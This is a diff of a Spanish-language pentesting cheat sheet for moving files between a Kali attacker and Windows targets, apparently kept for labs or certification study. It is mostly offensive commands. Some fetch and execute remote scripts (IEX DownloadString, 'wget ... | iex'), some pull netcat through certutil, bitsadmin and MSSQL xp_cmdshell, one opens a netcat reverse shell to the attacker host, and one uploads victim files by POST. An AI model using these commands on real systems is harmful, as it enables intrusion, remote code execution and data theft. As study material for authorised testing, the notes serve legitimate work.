@@ -59,7 +59,7 @@ Ir al navegador y colocar la IP de Kali para acceder al recurso
    # Servidor SMB → mejor cuando HTTP está bloqueado en la víctima
    # smb2support → soporte SMB2 para Windows 10+
 
-# MEJOR OPCIÓN SIEMPRE 
+#  <--   MEJOR OPCIÓN SIEMPRE   --> 
 4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
    # Con credenciales → cuando Windows bloquea conexiones SMB anónimas
    # El user y la passwd son inventadas (No importa)
@@ -78,6 +78,7 @@ EXTRA:
    ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/nc.exe','nc.exe')"
    # PowerShell → varias alternativas si una falla
    ❯ IEX (New-Object Net.WebClient).DownloadString('http://IP_Kali/PowerView.ps1')
+   ❯ wget -useb IP_Kali/PowerUP.ps1|iex;Invoke-AllChecks 
 
 2  ❯ certutil -urlcache -f http://IP_Kali/nc.exe C:\Users\Public\nc.exe
    ❯ certutil.exe -f -urlcache -split http://IP_Kali/nc64.exe C:\Temp\nc64.exe
@@ -89,7 +90,7 @@ EXTRA:
    ❯ \\IP_Kali\smbFolder\nc.exe -e cmd IP_Kali 443
    # Ejecutar directamente desde el SMB sin copiar al disco
 
-4 ❯ net use x: \\IP_Kali\smbFolder /u:omar omar123
+4 ❯ net use x: \\IP_Kali\smbFolder /u:omar omar123     <-- MEJOR OPCIÓN   
    # En Windows colocar las credenciales para hacer la transferencia
    # Se debe de copiar todo el folder y no por archivo  
    # Al solo hacer 'dir' no mostrará el volúmen pero si existirá
@@ -97,7 +98,6 @@ EXTRA:
 	  ❯ copy x:\nc.exe nc.exe   # Copiar el archivo hacia Windows
 	  ❯ copy file x:\file       # Copiar el archivo hacia Kali
 	  ❯ net use * /delete       # Terminar la conexión autenticada 
-
 
 EXTRA:
    ❯ bitsadmin /transfer job http://IP_Kali/nc.exe C:\Temp\nc.exe
@@ -184,6 +184,10 @@ EXTRA:
 
 3. ❯ powershell -c "Invoke-WebRequest -Uri http://<IP_KALI>/archivo.txt -Method POST -InFile C:\archivo.txt"
    # POST upload a servidor HTTP de Kali
+
+
+# Por si en Windows no permite el comando 'python3 -m http.server 80', este es la mejor opción 
+4. ❯ $h=[System.Net.HttpListener]::new(); $h.Prefixes.Add("http://+:80/"); $h.Start(); $c=$h.GetContext(); $f="C:\Temp\"+$c.Request.Url.Segments[-1]; $b=[IO.File]::ReadAllBytes($f); $c.Response.OutputStream.Write($b,0,$b.Length); $c.Response.Close()
 ```
 
 ### Atacante Kali — Recibir desde Windows
@@ -215,6 +219,9 @@ class UploadHandler(BaseHTTPRequestHandler):
         print(f"[+] Archivo recibido: {filename}")
 
 HTTPServer(('0.0.0.0', 8888), UploadHandler).serve_forever()
+
+# Descargar desde una shell MSSQL
+4. ❯ EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://IP_MS01/nc64.exe -OutFile C:\Temp\nc64.exe"'
 ```
 
 ---
